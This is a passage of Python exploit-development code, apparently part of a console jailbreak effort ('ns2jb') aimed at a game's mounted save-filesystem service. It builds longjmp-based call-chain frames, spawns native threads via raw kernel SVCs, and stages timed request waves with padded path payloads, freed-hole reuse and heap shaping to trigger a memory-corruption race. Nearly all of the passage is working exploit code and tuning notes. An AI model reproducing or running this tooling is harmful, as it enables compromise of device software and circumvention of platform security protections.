        # numbering in SVC_IDS is wrong (0x11/0x12 both return 0xE401, 0x10 succeeds but writes
        # nothing), so it is left off by default.
        self.state.setdefault("wave_allocs", []).extend([base, out])
        create = self.console.request(
            "svc", name="createThread", args=[out, sdk + SDK_OFFSETS["longjmp"], base,
                                               base + proof["bytes"], 0x2C, max(core or 0, 0)])
        handle = struct.unpack("<I", bytes.fromhex(self.console.request("read", address=out, length=4)["hex"]))[0]
        started = self.console.request("svc", name="startThread", args=[handle])
        pinned = None
        if core is not None and os.environ.get("CIV_TRY_SETAFFINITY"):
            pinned = self.console.request("svc", name="setThreadCoreMask",
                                          args=[handle, core, 1 << core])
        print("frame %#x create=%s start=%s cpuid=%s pin=%s"
              % (base, create["result"], started["result"], core if core is not None else 0,
                 pinned["result"] if pinned else "-"), flush=True)
        return base, proof

    def _poll_results(self, base, proof, timeout_s=3.0):
        until = time.time() + timeout_s
        while True:
            slots = [struct.unpack("<Q", bytes.fromhex(self.console.request(
                "read", address=base + off, length=8)["hex"]))[0] for off in proof["resultOffsets"]]
            if all(v != frames.SENTINEL for v in slots) or time.time() > until:
                return slots

    def guard_test(self):
        """Validate memcpy + the dynamic-argument loader: memcpy(trig, zero, {u32:decision}).

        This is the abort guard from probe-reserved-gap.cjs. With decision=1 one zero byte is
        copied onto the trigger path (it becomes an ordinary empty path, so the request aborts
        instead of overwriting); with decision=0 the copy is zero-length and the path is kept.
        """
        sdk = self.console.request("status")["sdkBase"]
        trig = self.console.request("alloc", pages=1)["address"]
        zero = self.console.request("alloc", pages=1)["address"]
        decision = self.console.request("alloc", pages=1)["address"]
        self.console.request("write", address=zero, hex="00" * 8)
        result = {}
        for value in (1, 0):
            self.console.request("write", address=trig, hex="2f2e2e2f" + "41" * 4)   # /../AAAA
            self.console.request("write", address=decision, hex=struct.pack("<I", value).hex() + "00" * 4)
            calls = [{"function": sdk + SDK_OFFSETS["memcpy"],
                      "args": [trig, zero, {"u32": decision}, 0]}]
            base, proof = self._launch_frame(calls)
            slots = self._poll_results(base, proof)
            first = self.console.request("read", address=trig, length=4)["hex"]
            result["decision_%d" % value] = {"firstFourBytes": first, "results": slots}
        return result

    def affinity_test(self):
        """Settle the SetThreadCoreMask ABI in one run.

        libnx: svcGetThreadCoreMask(int* out_ideal, u64* out_mask, Handle thread) and
        svcSetThreadCoreMask(Handle thread, int ideal_core, u64 affinity_mask). svc #0x11
        returned 0xE401 for (handle, core, 1<<core), so query the mask first, then try the
        -1-ideal and alternate-mask forms against a parked thread.
        """
        sdk = self.console.request("status")["sdkBase"]
        out = self.console.request("alloc", pages=1)["address"]
        self.console.request("write", address=out, hex="00" * 16)
        stack = self.console.request("alloc", pages=4)["address"]
        slot = self.console.request("alloc", pages=1)["address"]
        create = self.console.request("svc", name="createThread",
                                      args=[slot, sdk + 0x168B54, 10 ** 18, stack + 0x4000, 0x2C, 0])
        handle = struct.unpack("<I", bytes.fromhex(self.console.request("read", address=slot, length=4)["hex"]))[0]
        start = self.console.request("svc", name="startThread", args=[handle])
        result = {"create": create["result"], "handle": handle, "start": start["result"]}
        result["getOutFirst"] = self.console.request("svc", name="getThreadCoreMask",
                                                     args=[out, out + 8, handle])["result"]
        result["afterGetOutFirst"] = self.console.request("read", address=out, length=32)["hex"]
        self.console.request("write", address=out, hex="00" * 32)
        result["getHandleFirst"] = self.console.request("svc", name="getThreadCoreMask",
                                                        args=[handle, out, out + 8])["result"]
        result["afterGetHandleFirst"] = self.console.request("read", address=out, length=32)["hex"]
        variants = (("set0x11_ideal-1_mask1", "setThreadCoreMask", [-1, 1]),
                    ("set0x11_ideal0_mask1", "setThreadCoreMask", [0, 1]),
                    ("set0x11_ideal0_maskF", "setThreadCoreMask", [0, 0xF]),
                    ("set0x12_ideal-1_mask1", "setThreadCoreMaskAlt", [-1, 1]),
                    ("set0x12_ideal0_mask1", "setThreadCoreMaskAlt", [0, 1]),
                    ("set0x12_ideal0_maskF", "setThreadCoreMaskAlt", [0, 0xF]))
        for label, name, args in variants:
            result[label] = self.console.request("svc", name=name, args=[handle] + args)["result"]
        return result

    def fold_check(self):
        """Does a `1002` seed combine with a later `7` lookup to form one path?

        The extent payload splits a single path across the trigger (command 7, piece 0) and four
        tail seeds (command 1002, pieces 1-4). slash-check proved the whole path resolves as one
        descriptor, so this isolates whether the pieces combine across requests -- whichever
        session/order/descriptor form they need.
        """
        self.setup(reserve=False)
        fh = self.state["fh"]
        full = self.scratch + "//S0//S1//S2//SPAN_MARKER"
        half = len(full) // 2
        self.stage("fold_full", full)
        self.stage("fold_a", full[:half])
        self.stage("fold_b", full[half:])
        root = self.open_session("wave-root")     # the wave sends the 1002 tails on clone(root)

        def raw(command, name, context=9, handle=None):
            """Send a path request; return whether the FS answered and the reply's canonical.

            The wave sends the `1002` tails with context 3 and the `7` trigger with context 9
            (build_wave's `ctx3` set), and an unresolved request leaves the buffer holding its own
            SFCI request rather than a reply -- which is exactly what isolates this.
            """
            buf = bytearray(path_packet(command, self.paths[name]))
            struct.pack_into("<I", buf, data_start(buf) + 12, context)
            reply = self.console.request("send", handle=handle or fh, packet=bytes(buf).hex())
            hexed = reply["hex"]
            answered = b"SFCO" in bytes.fromhex(hexed)
            canonical = None
            if answered:
                try:
                    canonical = parse_reply(bytes.fromhex(hexed))["canonical"]
                except Exception:                                    # noqa: BLE001
                    canonical = None
            # The transport result distinguishes "the FS deferred this" from "the send was refused".
            return {"transport": reply.get("result"), "answered": answered,
                    "canonical": canonical, "hex": hexed[:64]}

        results = {"full7_save_ctx9": raw(7, "fold_full", 9),
                   "seed1002_save_ctx3": raw(1002, "fold_a", 3),
                   "seed1002_root_ctx3": raw(1002, "fold_a", 3, root),
                   "seed1002_root_ctx9": raw(1002, "fold_a", 9, root)}
        # After a seed on the root service, does a lookup on the *save* filesystem still answer,
        # and does the full path resolve?
        results["save7AfterRootSeed"] = raw(7, "fold_full", 9)
        results["root7AfterRootSeed"] = raw(7, "fold_full", 9, root)
        return results

    def fold_workers(self):
        """Race a `1002` seed against a `7` lookup from two native workers.

        The sequential probe cannot reproduce the wave's conditions: a seed changes FS state, so a
        lookup issued afterwards is refused (0xE401), whereas in the wave both are in flight
        concurrently. This runs the seed on a root session and the lookup on the save filesystem
        from two worker threads and reports both transports and both buffers.
        """
        sdk = self.console.request("status")["sdkBase"]
        self.setup(reserve=False)
        fh = self.state["fh"]
        root = self.open_session("fold-root")
        full = self.scratch + "//S0//S1//S2//SPAN_MARKER"
        half = len(full) // 2
        self.stage("fw_head", full[:half])
        self.stage("fw_tail", full[half:])
        self.stage("fw_full", full)

        def page(command, name, context):
            entry = self.paths[name]
            buf = context_bytes(path_packet(command, entry), context)
            at = self.console.request("alloc", pages=1)["address"]
            self.console.request("write", address=at, hex=buf.hex())
            return at

        seed_page = page(1002, "fw_head", 3)
        tail_page = page(1002, "fw_tail", 3)
        trig_page = page(7, "fw_full", 9)
        send = lambda handle: {"function": sdk + SDK_OFFSETS["send"],
                               "args": [0, 0x1000, handle, 0]}
        seed = send(root); seed["args"][0] = seed_page
        tail = send(root); tail["args"][0] = tail_page
        trig = send(fh); trig["args"][0] = trig_page
        launched = [self._launch_frame([seed], core=0), self._launch_frame([tail], core=1),
                    self._launch_frame([trig], core=2)]
        slots = [self._poll_results(base, proof, timeout_s=4.0) for base, proof in launched]
        out = {}
        for label, slot, at in (("seed", slots[0], seed_page), ("tail", slots[1], tail_page),
                                ("trigger", slots[2], trig_page)):
            hexed = self.console.request("read", address=at, length=256)["hex"]
            answered = b"SFCO" in bytes.fromhex(hexed)
            canonical = None
            if answered:
                try:
                    canonical = parse_reply(bytes.fromhex(hexed))["canonical"]
                except Exception:                                # noqa: BLE001
                    canonical = None
            out[label] = {"transport": slot[0] if slot else None, "answered": answered,
                          "canonical": canonical, "hex": hexed[:48]}
        out["selectedMarker"] = bool(out["trigger"]["canonical"] == 0)
        return out

    def slash_check(self):
        """Does the mounted filesystem collapse repeated slashes?

        The extent payload (ns2jb's layout, verified byte-for-byte) concatenates five pieces that
        are each padded with '/', so the folded path contains long `//` runs. If Civ VII's
        filesystem does not collapse them, the extent lookup falls through to an ordinary path and
        the trigger returns 0x202 instead of selecting the marker. Probe a known file three ways.
        """
        self.setup(reserve=False)
        fh = self.state["fh"]
        results = {}
        for label, path in (("single", self.scratch + "/canary"),
                            ("double", self.scratch + "//canary"),
                            ("triple", self.scratch + "///canary"),
                            ("segments", self.scratch + "//S0//S1//S2//SPAN_MARKER")):
            self.stage("probe_" + label, path)
            reply = self.path_send(fh, 7, "probe_" + label)
            results[label] = {"canonical": reply["canonical"], "data": reply["data"][:8].hex()}
        return results

    def worker_minimal(self):
        """Prove a raw-SVC thread runs at all.

        entry = the svcSleepThread stub (+0x168b54) and arg = ~31 years, so the thread
        enters the kernel and never returns. If the payload still answers afterwards,
        CreateThread/StartThread + an arbitrary entry work; any later fault is the frame.
        """
        sdk = self.console.request("status")["sdkBase"]
        out = self.console.request("alloc", pages=1)["address"]
        stack = self.console.request("alloc", pages=4)["address"]
        result = self.console.request(
            "svc", name="createThread",
            args=[out, sdk + 0x168B54, 10 ** 18, stack + 0x4000, 0x2C, 0])
        handle = struct.unpack("<I", bytes.fromhex(self.console.request("read", address=out, length=4)["hex"]))[0]
        print("createThread %s handle %#x" % (result, handle), flush=True)
        started = self.console.request("svc", name="startThread", args=[handle])
        print("startThread %s" % started, flush=True)
        time.sleep(0.3)
        status = self.console.request("status")
        print("payload still alive" if status.get("ok") else "payload gone", flush=True)
        return {"create": result, "handle": handle, "start": started,
                "alive": bool(status.get("ok")), "status": status}

    def worker_marker(self):
        """Isolate longjmp + the frame restore from the rest of the chain.

        Override the frame so the thread does: longjmp(base) -> restore x19..x30/sp ->
        saveResult64 stores w0 into x19 -> exitThread. x19 is aimed at a scratch page, so
        if the marker reads 1 then longjmp and the frame layout are correct and any fault
        is further along the chain.
        """
        sdk = self.console.request("status")["sdkBase"]
        code = {name: SDK_OFFSETS[name] for name in ("loadTable", "call4", "saveResult64", "exit", "memcpy")}
        calls = [{"function": sdk + SDK_OFFSETS["tick"], "args": [0, 0, 0, 0]}]
        _, shape = frames.build(0, sdk, calls, code)
        base = self.console.request("alloc", pages=shape["bytes"] // 0x1000)["address"]
        frame, proof = frames.build(base, sdk, calls, code)
        scratch = self.console.request("alloc", pages=1)["address"]
        self.console.request("write", address=scratch, hex="ef" * 8)
        raw = bytearray(frame)
        def putoff(offset, value):
            raw[offset:offset + 8] = value.to_bytes(8, "little")
        putoff(0x00, scratch)                              # x19 -> marker destination
        putoff(0x58, sdk + SDK_OFFSETS["saveResult64"])    # x30 -> store and continue
        putoff(proof["stackOffset"] + 8, sdk + 0x168B4C)   # continuation -> svcExitThread
        for at in range(0, len(raw), 0x1000):
            page = bytes(raw[at:at + 0x1000])
            if any(page):
                self.console.request("write", address=base + at, hex=page.hex())
        out = self.console.request("alloc", pages=1)["address"]
        result = self.console.request(
            "svc", name="createThread", args=[out, sdk + SDK_OFFSETS["longjmp"], base,
                                               base + proof["bytes"], 0x2C, 0])
        handle = struct.unpack("<I", bytes.fromhex(self.console.request("read", address=out, length=4)["hex"]))[0]
        started = self.console.request("svc", name="startThread", args=[handle])
        time.sleep(0.5)
        marker = struct.unpack("<Q", bytes.fromhex(self.console.request("read", address=scratch, length=8)["hex"]))[0]
        return {"create": result, "handle": handle, "start": started, "scratch": scratch,
                "marker": marker, "markerWritten": marker != 0xEFEFEFEFEFEFEFEF}

    def worker_chain(self):
        """Exercise loadTable -> call4 -> the call, then exit.

        The single call is saveResult64 itself, with args [marker, 0, 0, scratch]; call4
        puts args[3] into x19 and args[0] into x0, so a correct chain stores the marker
        into scratch. The continuation slot is redirected to svcExitThread so the thread
        ends cleanly and the marker is readable even if the tail is broken.
        """
        sdk = self.console.request("status")["sdkBase"]
        code = {name: SDK_OFFSETS[name] for name in ("loadTable", "call4", "saveResult64", "exit", "memcpy")}
        scratch = self.console.request("alloc", pages=1)["address"]
        self.console.request("write", address=scratch, hex="ef" * 8)
        marker = 0xC0FFEE
        calls = [{"function": sdk + SDK_OFFSETS["saveResult64"],
                  "args": [marker, 0, 0, scratch]}]
        _, shape = frames.build(0, sdk, calls, code)
        base = self.console.request("alloc", pages=shape["bytes"] // 0x1000)["address"]
        frame, proof = frames.build(base, sdk, calls, code)
        raw = bytearray(frame)
        raw[proof["stackOffset"] + 0xD8:proof["stackOffset"] + 0xE0] = (sdk + 0x168B4C).to_bytes(8, "little")
        for at in range(0, len(raw), 0x1000):
            page = bytes(raw[at:at + 0x1000])
            if any(page):
                self.console.request("write", address=base + at, hex=page.hex())
        out = self.console.request("alloc", pages=1)["address"]
        result = self.console.request(
            "svc", name="createThread", args=[out, sdk + SDK_OFFSETS["longjmp"], base,
                                               base + proof["bytes"], 0x2C, 0])
        handle = struct.unpack("<I", bytes.fromhex(self.console.request("read", address=out, length=4)["hex"]))[0]
        started = self.console.request("svc", name="startThread", args=[handle])
        time.sleep(0.5)
        value = struct.unpack("<Q", bytes.fromhex(self.console.request("read", address=scratch, length=8)["hex"]))[0]
        return {"create": result, "handle": handle, "start": started, "markerExpected": marker,
                "scratch": scratch, "marker": value, "chainOk": value == marker}

    def worker_direct(self, count=1):
        """Bring up one native worker by calling svcCreateThread directly.

        Bypasses the game's object-based `create`: the kernel only needs
        (out, entry, arg, stack_top, prio, cpuid), and the frame at `base` is a
        setjmp buffer whose restored x30 (= loadTable) is the resume PC. Any
        problem here (TLS, stack, ABI) shows up as createResult != 0 or a result
        slot left at SENTINEL.
        """
        sdk = self.console.request("status")["sdkBase"]
        code = {name: SDK_OFFSETS[name] for name in ("loadTable", "call4", "saveResult64", "exit", "memcpy")}
        calls = [{"function": sdk + SDK_OFFSETS["tick"], "args": [0, 0, 0, 0]}
                 for _ in range(count)]
        _, shape = frames.build(0, sdk, calls, code)
        pages = shape["bytes"] // 0x1000
        print("frame bytes %#x (%d pages)" % (shape["bytes"], pages), flush=True)

        # Prove the allocator first: a failed calloc returns 0 and the frame write
        # would fault at address ~0. A 1-page alloc plus a round-trip read is cheap.
        probe = self.console.request("alloc", pages=1)["address"]
        print("probe page %#x" % probe, flush=True)
        self.console.request("write", address=probe, hex="a5" * 8)
        back = self.console.request("read", address=probe, length=8)["hex"]
        print("probe read-back %s" % back, flush=True)
        assert probe > 0x10000 and back == "a5" * 8, "allocator returned an unusable address"

        base = self.console.request("alloc", pages=pages)["address"]
        print("frame base %#x .. %#x" % (base, base + shape["bytes"]), flush=True)
        assert base > 0x10000, "frame allocation returned address 0"
        frame, proof = frames.build(base, sdk, calls, code)
        # console.js readFrame caps a frame at 0x8000 JSON bytes (~0x3f00 raw), and
        # the standard layout is mostly zero, so send only occupied 0x1000 pages.
        for at in range(0, len(frame), 0x1000):
            page = frame[at:at + 0x1000]
            if not any(page):
                continue
            print("  write page +%#x" % at, flush=True)
            self.console.request("write", address=base + at, hex=page.hex())
            verify = self.console.request("read", address=base + at, length=32)["hex"]
            assert verify == page[:32].hex(), "frame page +%#x did not read back" % at
        print("frame written", flush=True)
        # sdk+priority (+0x1370c0) takes a thread argument; calling it bare faulted
        # the payload. Use the standard application priority instead.
        prio = 0x2C
        out = self.console.request("alloc", pages=1)["address"]
        result = self.console.request(
            "svc", name="createThread",
            args=[out, sdk + SDK_OFFSETS["longjmp"], base, base + proof["bytes"], prio, 0])
        handle = struct.unpack("<I", bytes.fromhex(self.console.request("read", address=out, length=4)["hex"]))[0]
        print("createThread result %s handle %#x" % (result, handle), flush=True)
        # CreateThread leaves the thread created-but-not-running, so start it too.
        started = self.console.request("svc", name="startThread", args=[handle])
        print("startThread %s" % started, flush=True)
        time.sleep(0.5)
        slots = [struct.unpack("<Q", bytes.fromhex(self.console.request(
            "read", address=base + off, length=8)["hex"]))[0] for off in proof["resultOffsets"]]
        return {"sdkBase": sdk, "base": base, "frameBytes": proof["bytes"], "priority": prio,
                "calls": count, "createResult": result, "handle": handle, "startResult": started,
                "resultSlots": slots, "allWritten": all(v != frames.SENTINEL for v in slots),
                "resultSlot": slots[-1], "slotWritten": slots[-1] != frames.SENTINEL}

    def worker_test(self):
        """Minimal native-thread bring-up: build a 1-call frame, create a thread,
        let it run, and read the result slot. No heap shaping, so it cannot trip
        the FS abort guard."""
        sig_path = Path(__file__).resolve().parent.parent / "relocation" / "signatures" / "sdk-resolved.json"
        off = {f["name"]: f["offset"] for f in json.loads(sig_path.read_text())["functions"]}
        sdk = self.console.request("status")["sdkBase"]
        code = {"loadTable": off["loadTable"], "call4": off["call4"],
                "saveResult64": off["saveResult64"], "exit": off["exit"],
                "longjmp": off["longjmp"], "memcpy": off["memcpy"]}
        base = self.console.request("alloc", pages=0x20)["address"]
        slot = self.console.request("alloc", pages=1)["address"]
        calls = [{"function": sdk + off["tick"], "args": [0, 0, 0, 0]}]
        frame, proof = frames.build(base, sdk, calls, code)
        # Sanity: the write path works at this address before touching the frame.
        self.console.request("write", address=base, hex=(b"\x41" * 8).hex())
        back = bytes.fromhex(self.console.request("read", address=base, length=8)["hex"])
        assert back == b"\x41" * 8, "write/read verify failed at the frame base"
        # Sparse: only write non-zero 0x1000 pages, so the console's ~160 KiB
        # inbound buffer is never approached.
        for offset in range(0, len(frame), 0x1000):
            part = frame[offset:offset + 0x1000]
            if any(part):
                self.console.request("write", address=base + offset, hex=part.hex())
        self.console.request("write", address=slot, hex=(b"\0" * 16).hex())
        created = self.console.request("call", address=sdk + off["create"],
                                       args=[slot, 0, sdk + off["longjmp"], base])
        thread = int.from_bytes(bytes.fromhex(
            self.console.request("read", address=slot, length=8)["hex"]), "little")
        self.console.request("call", address=sdk + 0x168b54, args=[50000000])   # svcSleepThread 50 ms
        result = int.from_bytes(bytes.fromhex(
            self.console.request("read", address=base + proof["resultOffset"], length=8)["hex"]), "little")
        return {"created": created, "thread": thread, "result": str(result),
                "sentinel": str(frames.SENTINEL), "ran": result != frames.SENTINEL,
                "base": hex(base), "slot": hex(slot), "frameBytes": proof["bytes"],
                "resultOffset": hex(proof["resultOffset"])}

    def discover_mount(self):
        """Find the save accessor by scanning readable+writable regions; persist it."""
        status = self.console.request("status")
        sdk, main = status["sdkBase"], status["mainBase"]
        regions = self.console.request("regions")["regions"]
        cands = [r for r in regions if (int(r["perm"]) & 3) == 3
                 and (r["size"] <= 0x200000
                      or (r["size"] <= 0x2000000
                          and (abs(r["base"] - sdk) <= 0x8000000 or abs(r["base"] - main) <= 0x8000000)))]
        names = ["save\x00", "tmp\x00", "SdCard\x00", "GameCard\x00", "SaveData\x00",
                 "Content\x00", "Host\x00", "Nand\x00", "System\x00", "User\x00",
                 "Prod\x00", "Safe\x00", "Aoc\x00", "Rom\x00"]
        # Host-side search over the proven `read` command, chunked and short of the end.
        found, hits = [], 0
        for reg in cands:
            limit = max(0, reg["size"] - 16)
            off = 0
            while off < limit:
                n = min(0x8000, limit - off)
                buf = bytes.fromhex(self.console.request("read", address=reg["base"] + off, length=n)["hex"])
                i = buf.find(b"save\x00")
                while i >= 0:
                    found.append(reg["base"] + off + i)
                    hits += 1
                    i = buf.find(b"save\x00", i + 1)
                off += n
        accessor = None
        for name_address in found:
            window = bytes.fromhex(self.console.request("read", address=name_address - 24, length=0x40)["hex"])
            if len(window) < 0x30:
                continue
            name = window[0x18:0x28].split(b"\x00")[0]
            pad = int.from_bytes(window[0x20:0x28], "little")
            impl = int.from_bytes(window[0x28:0x30], "little")
            if name == b"save" and pad == 0 and impl > 0x100000000:
                accessor = name_address - 24
                break
        if accessor is not None:
            Path(__file__).with_name("mount-accessor.txt").write_text("0x%x\n" % accessor)
        return {"accessor": accessor, "candidates": len(cands), "hits": hits}

    def mounted_save(self, accessor=None):
        """Copy the game's mounted save filesystem (ns2jb mounted-save.cjs).

        accessor is the mount accessor address (name at +24). It is found by the
        relocation payload's `mounts` scan and saved to mount-accessor.txt.
        """
        if accessor is None:
            accessor = int(Path(__file__).with_name("mount-accessor.txt").read_text().strip(), 0)
        rd = lambda a, n: bytes.fromhex(self.console.request("read", address=a, length=n)["hex"])
        get64 = lambda b, o=0: int.from_bytes(b[o:o + 8], "little")
        get32 = lambda b, o=0: int.from_bytes(b[o:o + 4], "little")
        impl = get64(rd(accessor, 0x30), 40)
        service = get64(rd(impl, 0x20), 16)
        sb = rd(service, 0x20)
        manager, objectId = get64(sb, 16), get32(sb, 24)
        mb = rd(manager, 0x80)
        assert get32(mb, 8) == 0x800 and get32(mb, 0x5c) == 3, "unexpected SDK session manager"
        borrowed = get32(rd(get64(mb, 16), 8), 0)
        reply = parse_reply(self.console.request("send", handle=borrowed,
                                                 packet=control(1, u32(objectId)).hex())["hex"])
        assert not reply["result"] and reply["moves"], "save filesystem copy failed"
        self.state["mounted"] = {"accessor": accessor, "borrowed": borrowed,
                                 "objectId": objectId, "handle": reply["moves"][0]}
        return reply["moves"][0]

    def path_send(self, handle, command, name, input=b"", descriptors=None):
        return parse_reply(self.console.request("send", handle=handle,
            packet=self.path_request(command, name, input, descriptors))["hex"])

    def path_request(self, command, name, input=b"", descriptors=None):
        """Plain CMIF path method, mirroring ns2jb memory/paths.cjs paths.normal."""
        entry = self.paths[name]
        return context_bytes(path_packet(command, entry, input, descriptors), 9)

    def stage_extent(self, profile):
        """ns2jb trigger payload: five 0x800 pieces in receive order, '/' padding to extent.

        The descriptor still declares 0x800 while the page holds 0x2800 bytes; that gap
        is exactly what the qualification probes measure.
        """
        pieces = ["/" for _ in range(5)]
        for i, segment in enumerate(SEGMENTS):
            pieces[i] = "/" + segment + "/"
        pieces[3] = "/" + (MARKER if profile == "extent-present" else ABSENT)
        if profile == "positive":
            pieces[2] = "/\\."
        payload = bytearray(5 * 0x800)
        for i, piece in enumerate(pieces):
            data = piece.encode()
            payload[(i + 1) * 0x800 - 1 - len(data):(i + 1) * 0x800 - 1] = data
        selected = self.state["selected"].encode()
        payload[MARKER_OFFSET:MARKER_OFFSET + len(selected)] = selected
        payload[MARKER_OFFSET + len(selected):EXTENT] = b"/" * (EXTENT - MARKER_OFFSET - len(selected))
        entry = {"address": self.console.request("alloc", pages=3)["address"], "size": 0x800}
        # Record it: _stage_extent_ns2jb reallocates the trigger region and orphans this page,
        # and freeAddresses can only reclaim what is in wave_allocs (review point 3).
        self.state.setdefault("wave_allocs", []).append(entry["address"])
        self.console.request("write", address=entry["address"], hex=bytes(payload).hex())
        self.paths["trigger"] = entry
        return entry

    def build_wave(self, profile):
        """Role order and delays copied from ns2jb probe-reserved-gap.cjs wave()."""
        state = self.state["gap"]
        self.stage_extent(profile)
        steps = [
            {"role": "commit", "kind": "sync", "delayNs": 0,
             "packet": context_bytes(packet(10, u64(0), send=[self.paths["commit"]]), 9)},
            {"role": "hole", "kind": "post", "delayNs": 300000,
             "packet": context_bytes(packet(0, u64(0) + u64(PROBE_READ_SIZE),
                                            receive=[{"address": self.paths["hole"]["address"],
                                                     "size": PROBE_READ_SIZE, "mode": 1}]), 3)},
        ]
        for i, delay in enumerate([350000, 450000, 550000, 650000]):
            steps.append({"role": "tail%d" % i, "kind": "post", "delayNs": delay,
                          "packet": context_bytes(path_packet(1002, self.paths["tail%d" % i]), 3)})
        steps.append({"role": "canary", "kind": "post", "delayNs": 1700000,
                      "packet": context_bytes(path_packet(7, self.paths["canary"]), 3)})
        for i, delay in enumerate([2000000, 2150000]):
            # ns2jb's filler: descriptors [marker16 (16B), page_absent (0x7ef normalized)] —
            # NOT the filler's own path (pass-4 review, probe-reserved-gap.cjs:288-290).
            steps.append({"role": "filler%d" % i, "kind": "post", "delayNs": delay,
                          "packet": context_bytes(path_packet(5, self.paths["filler%d" % i],
                                                              descriptors=[self.paths["marker16"], self.paths["page_absent"]]), 3)})
        for i, delay in enumerate([2400000, 2550000]):
            steps.append({"role": "guard%d" % i, "kind": "post", "delayNs": delay,
                          "packet": context_bytes(path_packet(5, self.paths["guard%d" % i],
                                                              descriptors=[self.paths["guard%d" % i], self.paths["page_absent"]]), 3)})
        # BUGFIX (external review, verified against r16a2 bytes): context_bytes must NEVER wrap
        # close_object — its at+4 write lands on byte 20, which for a domain packet IS the object
        # id, so every wave closed object 1 instead of group.outer (visible in the release row's
        # hex: ...02000000 01000000...). The 59-object reservation was never released, the group
        # leaked per attempt, and the FS degraded after ~3 cycles. close_object has its own
        # context parameter; ns2jb writes closeObject(group.outer) into requests[9] unmodified.
        steps.append({"role": "release", "kind": "post", "delayNs": 2800000,
                      "packet": close_object(self.state["outer"], 3)})
        steps.append({"role": "trigger", "kind": "post", "delayNs": 3200000,
                      "packet": context_bytes(path_packet(7, self.paths["trigger"]), 3)})
        steps.append({"role": "counters", "kind": "sync", "delayNs": 3600000,
                      "packet": context_bytes(domain(state["root"], COUNT_OBJECTS), 9)})
        return {"label": profile, "handle": state["handle"], "dataSize": 128, "steps": steps,
                "gates": {"minSpacingMicroseconds": 300, "results": True, "allowTimeout": True}}

    def setup(self, label="gap", accessor=None, reserve=False):
        """Open the mounted save filesystem, create the scratch tree, stage every path page.

        reserve=False by default: the 59-object reservation aborted the process when run
        standalone, so it is opt-in until the wave preconditions are understood.
        """
        if self.state.get("mounted"):
            raise RuntimeError("setup already ran in this process; the mounted save session "
                               "is single-use — restart the game before another setup/wave")
        state = self.open_domain(label)
        self.state["gap"] = state
        # Use the accessor from `relocation/host/relocate_host.py <ip> mounts`,
        # which must be re-run every boot (the accessor moves, and reading a stale
        # one faults the process). The harness's own discover_mount faults, so it is
        # not used here.
        # Path methods require a path-capable filesystem handle, not the domain session.
        fh = self.mounted_save(accessor)
        self.state["fh"] = fh
        self.paths["commit"] = {"address": self.console.request("alloc", pages=1)["address"], "size": 0x800}
        self.console.request("write", address=self.paths["commit"]["address"],
                             hex=("/saves" + "\0" * (0x800 - 6)).encode().hex())
        self.paths["hole"] = {"address": self.console.request("alloc", pages=PROBE_READ_SIZE // 0x1000)["address"],
                              "size": PROBE_READ_SIZE}
        self.state["selected"] = self.scratch + "/selected"
        # ns2jb stages these as padded MISSING paths of an exact length, not short paths with a
        # declared size. CIV_NORMALIZED_PATHS=1 uses the faithful form; CANARY_SIZE is the
        # byte-level geometry lever (the reservation knob moves ~208 and crashes).
        normalized = bool(os.environ.get("CIV_NORMALIZED_PATHS"))
        # CIV_CANARY_DEPTH: a deeper canary path with long component names. A lookup's cost
        # follows the path it must resolve, and the canary has the tightest window of all the
        # protected roles (105-520 us, against ~1.8 ms for roles that defer). CIV_NORMALIZED_PATHS
        # also widens it (6587 us observed) but resolves to a MISSING path, flipping the canary to
        # result 0x202 / type 0; a deep but VALID tree keeps result 0 / type 1. Its directories are
        # created with the rest of the scratch tree below.
        canary_depth = int(os.environ.get("CIV_CANARY_DEPTH") or 0)
        if normalized:
            # ns2jb-faithful (pass-4 review, probe-reserved-gap.cjs:210-215): the canary IS the
            # 0x5a0 normalized path, its 32-'A' parent chain is CREATED on disk, the terminal
            # file is created, and GetEntryType verifies result 0 / type 1. (The original
            # normalized run returned 0x202 because the chain was never created — CIV_CANARY_DEPTH
            # was invented as a workaround for exactly that.)
            canary_text = normalized_path(self.scratch + "/canary", CANARY_SIZE)
            self.state["canary_chain"] = canary_text
            # Descriptor size must cover the NUL: the text is exactly CANARY_SIZE chars and the
            # staged payload is text + "\0" (CANARY_SIZE + 1 bytes). The old size=CANARY_SIZE
            # left the terminator OUTSIDE the declared window, so the server read 1440 bytes of
            # unterminated path and returned 0x202 — the entire round-25b "cannot resolve"
            # mystery. The setup's canary_file verify always used len(text)+1 and resolved fine;
            # this makes the wave's descriptor match it byte for byte.
            self.stage("canary", canary_text, CANARY_SIZE + 1)
        elif canary_depth:
            self.state["canary_dir"] = self.scratch + "/" + "/".join(
                "canary_span_%02d_%s" % (level, "c" * 40) for level in range(canary_depth))
            self.stage("canary", self.state["canary_dir"] + "/canary", CANARY_SIZE)
        else:
            self.stage("canary", self.scratch + "/canary", CANARY_SIZE)
        # ns2jb's guard pair: ONE normalized 0x300 missing path, and the same path with the last
        # character swapped to 'C' — never created on disk (their 0x202 IS the expected control
        # result). Always normalized regardless of CIV_NORMALIZED_PATHS: the FS exercises the
        # declared length, so a ~26-byte string under a 0x301 descriptor is a different request
        # internally (pass-4 review, probe-reserved-gap.cjs:282-290).
        guard_text = normalized_path(self.scratch + "/absent", 0x300)
        self.stage("guard0", guard_text, 0x300)
        self.stage("guard1", guard_text[:-1] + "C", 0x300)
        # The filler's second descriptor is ns2jb's page_absent (0x7ef normalized, missing), not
        # the filler's own short path.
        self.stage("page_absent", normalized_path(self.scratch + "/page_absent", 0x7ef), 0x7ef)
        self.stage("marker16", "/NS2_SRC00000000", 16)
        # CIV_SACRIFICE (round-52 deliberate-hole design): a MISSING normalized path at
        # the canary's declared size class. The SM3 dig's landing law: the aliased write
        # lands in/near FREED same-class server-side copies (~21/23 events on non-windowed
        # draws; windowed hits are the rare live-copy channel Stage A needs). This role
        # frees a 0x7f1-class hole mid-wave (sent ~1.2 ms, fast 0x202 miss reply) BEFORE
        # the canary's ~2.41 ms gated dispatch: the canary's server-side copy can then
        # REUSE that hole (LIFO), aiming the freed-hole landing channel at the canary
        # INSIDE windowed draws. Staged like the canary (normalized, size covers the NUL)
        # so both copies share the FS allocator bin exactly.
        if os.environ.get("CIV_SACRIFICE"):
            self.stage("sacrifice0", normalized_path(self.scratch + "/sacrifice", 0x7f0), 0x7f1)
        self.stage("tail0", "/" + SEGMENTS[0] + "/")
        self.stage("tail1", "/" + SEGMENTS[1] + "/")
        self.stage("tail2", "/" + SEGMENTS[2] + "/")
        # Diagnosed (second review + aggregation): tail3 NEVER defers (0/10) while tail2 always does
        # (9/9) -- same opcode, same client type, and moving its delay to 2.2 ms (where the guards
